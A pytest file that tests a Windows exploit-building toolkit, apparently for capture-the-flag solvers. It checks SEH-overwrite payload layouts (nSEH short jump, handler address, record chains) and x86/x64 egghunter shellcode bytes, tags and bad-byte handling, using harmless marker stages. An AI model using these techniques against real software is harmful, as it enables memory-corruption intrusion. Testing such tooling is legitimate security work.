"""Deterministic tests for r5b Windows SEH and egghunter builders."""
from __future__ import annotations

import struct
import sys
from pathlib import Path

import pytest


REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))

from contract import PayloadBuild  # noqa: E402
import windows_pwn as windows  # noqa: E402


def assert_contract(result: PayloadBuild) -> None:
    payload, placements = result
    assert payload == result.payload
    assert placements == result.placements
    assert all(0 <= offset <= len(payload) for offset in placements.values())
    for name, width in result.widths.items():
        assert placements[name] + width <= len(payload)


def test_seh_overwrite_exact_layout_and_marker():
    marker = b"R5B_SEH_STAGE"
    result = windows.build_seh_overwrite(
        offset_to_nseh=32,
        seh_handler=0x625011AF,
        stage=marker,
        prefix=b"HDR",
        tail=b"END",
    )
    assert_contract(result)
    assert result.architecture == "windows-x86"
    assert result.strategy == "seh-overwrite"
    assert len(result.payload[:32]) == 32
    assert result.payload.startswith(b"HDR" + b"A" * 29)
    assert result.payload[result.placements["nseh"]:][:4] == b"\xeb\x06\x90\x90"
    assert struct.unpack_from("<I", result.payload, result.placements["seh"])[0] == 0x625011AF
    assert result.slice("stage") == marker
    assert result.payload[result.placements["tail"]:] == b"END"


def test_seh_overwrite_rejects_unsafe_shapes_and_bad_bytes():
    with pytest.raises(windows.WindowsBuildError, match="prefix is longer"):
        windows.build_seh_overwrite(
            offset_to_nseh=2, seh_handler=0x41414141, stage=b"x", prefix=b"long",
        )
    with pytest.raises(windows.WindowsBuildError, match="forbidden bytes"):
        windows.build_seh_overwrite(
            offset_to_nseh=4, seh_handler=0x41414141, stage=b"R5B",
            bad_bytes=[0x41],
        )


def test_seh_record_chain_serializes_next_and_handler_pairs():
    result = windows.build_seh_record_chain(
        record_addresses=[0x1000, 0x1008, 0x1010],
        handler_addresses=[0x401000, 0x402000, 0x403000],
    )
    assert_contract(result)
    assert result.base_address == 0x1000
    assert result.absolute_placements()["record.1"] == 0x1008
    rows = [struct.unpack_from("<II", result.payload, i * 8) for i in range(3)]
    assert rows == [
        (0x1008, 0x401000),
        (0x1010, 0x402000),
        (0xFFFFFFFF, 0x403000),
    ]
    with pytest.raises(windows.WindowsBuildError, match="contiguous"):
        windows.build_seh_record_chain(
            record_addresses=[0x1000, 0x2000], handler_addresses=[1, 2],
        )


def test_x86_egghunter_is_canonical_32_bytes_and_stage_is_double_tagged():
    marker = b"R5B_X86_EGG_STAGE"
    result = windows.build_egghunter(
        architecture="i386", tag=b"r5b!", stage=marker, separation=b"PAD",
    )
    assert_contract(result)
    assert result.architecture == "windows-x86"
    assert result.strategy == "egghunter-int2e"
    assert result.widths["hunter"] == 32
    assert result.payload[:4] == bytes.fromhex("6681caff")
    assert result.slice("hunter.tag_immediate") == b"r5b!"
    assert result.slice("egg.first") == result.slice("egg.second") == b"r5b!"
    assert result.slice("stage") == marker
    assert result.placements["egg.first"] == 35


def test_x64_egghunter_serializes_bounds_tag_and_failure_target():
    marker = b"R5B_X64_EGG_STAGE"
    start = 0x0000000140000000
    end = 0x0000000140010000
    failure = 0x0000000140001234
    result = windows.build_egghunter(
        architecture="amd64", tag="EGG!", stage=marker,
        range_start=start, range_end=end, failure_address=failure,
    )
    assert_contract(result)
    assert result.architecture == "windows-x64"
    assert result.strategy == "egghunter-bounded-scan"
    assert struct.unpack_from("<Q", result.payload, result.placements["hunter.range_start"])[0] == start
    assert struct.unpack_from("<Q", result.payload, result.placements["hunter.range_end"])[0] == end
    assert struct.unpack_from("<Q", result.payload, result.placements["hunter.failure_address"])[0] == failure
    assert result.slice("hunter.tag_immediate") == b"EGG!"
    assert result.slice("egg.first") == result.slice("egg.second") == b"EGG!"
    assert result.slice("stage") == marker
    # Both rel8 back/forward branches remain within the emitted hunter.
    hunter = result.slice("hunter")
    assert b"\x48\x8d\x42\x07\x48\x39\xc8\x73" in hunter
    assert b"\x73" in hunter and hunter.count(b"\x75") == 2 and b"\xeb" in hunter


def test_x64_hunter_without_failure_address_ends_in_int3():
    result = windows.build_egghunter(
        architecture="x64", tag="R5B!", stage=b"MARKER",
        range_start=0x10000000, range_end=0x10001000,
    )
    assert_contract(result)
    assert result.slice("hunter").endswith(b"\xcc")
    assert "hunter.failure_address" not in result.placements


def test_egghunter_constraints_are_explicit_and_deterministic():
    kwargs = dict(
        architecture="x64", tag="R5B!", stage=b"stage",
        range_start=0x100000, range_end=0x101000,
    )
    first = windows.build_egghunter(**kwargs)
    second = windows.build_egghunter(**kwargs)
    assert first.payload == second.payload
    assert dict(first.placements) == dict(second.placements)
    with pytest.raises(windows.WindowsBuildError, match="requires range"):
        windows.build_egghunter(architecture="x64", tag="R5B!", stage=b"x")
    with pytest.raises(windows.WindowsBuildError, match="below"):
        windows.build_egghunter(
            architecture="x64", tag="R5B!", stage=b"x",
            range_start=0x2000, range_end=0x1000,
        )
    with pytest.raises(windows.WindowsBuildError, match="exactly four"):
        windows.build_egghunter(architecture="x86", tag="bad", stage=b"x")
    with pytest.raises(windows.WindowsBuildError, match="forbidden bytes"):
        windows.build_egghunter(
            architecture="x86", tag="R5B!", stage=b"x", bad_bytes=[0xCD],
        )

